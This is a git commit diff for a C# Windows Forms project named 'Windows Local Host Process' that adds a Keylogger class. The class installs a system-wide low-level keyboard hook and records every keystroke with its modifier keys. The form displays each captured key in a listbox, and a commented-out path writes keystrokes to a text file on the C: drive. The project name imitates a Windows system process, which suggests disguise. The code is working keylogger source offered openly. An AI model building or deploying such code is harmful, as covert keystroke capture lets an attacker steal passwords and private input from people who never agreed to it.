1a2233a0176b63912d4b52bb92fe9eebeb799a5c
vbtiger <varga.balazs.official@gmail.com>
2017-10-18 20:42:45 +0200

    Created Keylogger class to watch low level keyboard events and wired it into the listbox of the form (fixes issue#1)

--- Windows Local Host Process/Form1.cs
+++ Windows Local Host Process/Form1.cs
@@ -12,19 +12,36 @@ using System.IO;
 
 namespace Windows_Local_Host_Process
 {
-    public partial class Form1 : Form
-    {
-        public Form1()
-        {
-            InitializeComponent();
-        }
-        private void Form1_KeyUp(object sender, KeyEventArgs e)
-        {
-            //ListBox list1 = new ListBox();
-            //list1.Items.Add(e.KeyCode);
-            StreamWriter sw = new StreamWriter(@"C:\Bhola.txt", true);
-            sw.Write(e.KeyCode);
-            sw.Close();
-        }
-    }
+	public partial class Form1 : Form
+	{
+		public Form1()
+		{
+			Keylogger.StartWatching();
+
+			Keylogger.KeyPressed += this.HandleLowLevelEvent;
+			Keylogger.KeyReleased += this.HandleLowLevelEvent;
+
+			this.InitializeComponent();
+		}
+
+		private void HandleLowLevelEvent(object sender, Keylogger.KeyboardEventData e)
+		{
+			string modifiers = e.ModifierKeys.Count > 0 ? $"({string.Join("+", e.ModifierKeys)}) + " : "";
+
+			string log = $"{modifiers}{e.MainKey} {{{e.EventType}}}";
+
+			this.listBox1.Items.Add(log);
+
+			this.listBox1.SelectedIndex = this.listBox1.Items.Count - 1;
+
+			//StreamWriter sw = new StreamWriter(@"C:\Bhola.txt", true);
+			//sw.Write(log);
+			//sw.Close();
+		}
+
+		private void Form1_FormClosed(object sender, FormClosedEventArgs e)
+		{
+			Keylogger.StopWatching();
+		}
+	}
 }
---
+++ Windows Local Host Process/Keylogger.cs
@@ -0,0 +1,139 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace Windows_Local_Host_Process
+{
+	internal static class Pinvokes
+	{
+		public delegate IntPtr WindowHookHandler(int nCode, IntPtr wParam, IntPtr lParam);
+
+		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		public static extern IntPtr SetWindowsHookEx(int idHook, WindowHookHandler lpfn, IntPtr hMod, uint dwThreadId);
+
+		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		[return: MarshalAs(UnmanagedType.Bool)]
+		public static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+		[DllImport("user32.dll")]
+		public static extern short GetKeyState(int vKey);
+
+		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+	}
+
+	internal static class Keylogger
+	{
+		private static IntPtr keyboardHook = IntPtr.Zero;
+		private static readonly Pinvokes.WindowHookHandler keyboardHookHandler = KeyboardHookCallbackFunction;
+
+		[StructLayout(LayoutKind.Sequential)]
+		private struct KeyboardLLHookStruct
+		{
+			public uint vkCode;
+			public uint scanCode;
+			public KBDLLHOOKSTRUCTFlags flags;
+			public uint time;
+			public UIntPtr dwExtraInfo;
+		}
+		[Flags]
+		private enum KBDLLHOOKSTRUCTFlags : uint
+		{
+			LLKHF_EXTENDED = 0x01,
+			LLKHF_INJECTED = 0x10,
+			LLKHF_ALTDOWN = 0x20,
+			LLKHF_UP = 0x80,
+		}
+		[Flags]
+		public enum KeyboardEventState
+		{
+			WM_KEYDOWN = 256,
+			WM_KEYUP = 257,
+			WM_SYSKEYDOWN = 260,
+			WM_SYSKEYUP = 261
+		}
+		public struct KeyboardEventData
+		{
+			public List<VirtualKeys> ModifierKeys;
+			public VirtualKeys MainKey;
+			public KeyboardEventState EventType;
+		}
+
+		public static event EventHandler<KeyboardEventData> KeyPressed;
+		public static event EventHandler<KeyboardEventData> KeyReleased;
+
+		public static void StartWatching()
+		{
+			if (keyboardHook == IntPtr.Zero)
+				keyboardHook = SetHook(13, keyboardHookHandler);
+		}
+
+		public static bool StopWatching()
+		{
+			bool success = Pinvokes.UnhookWindowsHookEx(keyboardHook);
+			keyboardHook = IntPtr.Zero;
+
+			return success;
+		}
+
+		private static IntPtr SetHook(int hookId, Pinvokes.WindowHookHandler callbackFunc)
+		{
+			using (Process curProcess = Process.GetCurrentProcess())
+			{
+				using (ProcessModule curModule = curProcess.MainModule)
+				{
+					return Pinvokes.SetWindowsHookEx(hookId, callbackFunc, Pinvokes.GetModuleHandle(curModule.ModuleName), 0);
+				}
+			}
+		}
+
+		private static IntPtr KeyboardHookCallbackFunction(int nCode, IntPtr wParam, IntPtr lParam)
+		{
+			KeyboardLLHookStruct lowLevelEventData = (KeyboardLLHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyboardLLHookStruct));
+
+			KeyboardEventData eventData = new KeyboardEventData
+			{
+				MainKey = VirtualKeys.None,
+				ModifierKeys = new List<VirtualKeys>()
+			};
+
+			if (Pinvokes.GetKeyState((int)VirtualKeys.LShiftKey) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.LShiftKey)
+			{
+				eventData.ModifierKeys.Add(VirtualKeys.LShiftKey);
+			}
+			if (Pinvokes.GetKeyState((int)VirtualKeys.RShiftKey) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.RShiftKey)
+			{
+				eventData.ModifierKeys.Add(VirtualKeys.RShiftKey);
+			}
+
+			if (Pinvokes.GetKeyState((int)VirtualKeys.LControlKey) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.LControlKey)
+				eventData.ModifierKeys.Add(VirtualKeys.LControlKey);
+			if (Pinvokes.GetKeyState((int)VirtualKeys.RControlKey) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.RControlKey)
+				eventData.ModifierKeys.Add(VirtualKeys.RControlKey);
+			if (Pinvokes.GetKeyState((int)VirtualKeys.LMenu) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.LMenu)
+				eventData.ModifierKeys.Add(VirtualKeys.LMenu);
+			if (Pinvokes.GetKeyState((int)VirtualKeys.RMenu) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.RMenu)
+				eventData.ModifierKeys.Add(VirtualKeys.RMenu);
+			if (Pinvokes.GetKeyState((int)VirtualKeys.LWin) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.LWin)
+				eventData.ModifierKeys.Add(VirtualKeys.LWin);
+			if (Pinvokes.GetKeyState((int)VirtualKeys.RWin) < 0 || (VirtualKeys)lowLevelEventData.vkCode == VirtualKeys.RWin)
+				eventData.ModifierKeys.Add(VirtualKeys.RWin);
+
+			eventData.MainKey = (VirtualKeys)lowLevelEventData.vkCode;
+
+			eventData.EventType = (KeyboardEventState)wParam;
+
+			if (KeyPressed != null && (eventData.EventType == KeyboardEventState.WM_KEYDOWN || eventData.EventType == KeyboardEventState.WM_SYSKEYDOWN))
+				KeyPressed(null, eventData);
+			if (KeyReleased != null && (eventData.EventType == KeyboardEventState.WM_KEYUP || eventData.EventType == KeyboardEventState.WM_SYSKEYUP))
+				KeyReleased(null, eventData);
+
+			return Pinvokes.CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+		}
+	}
+}
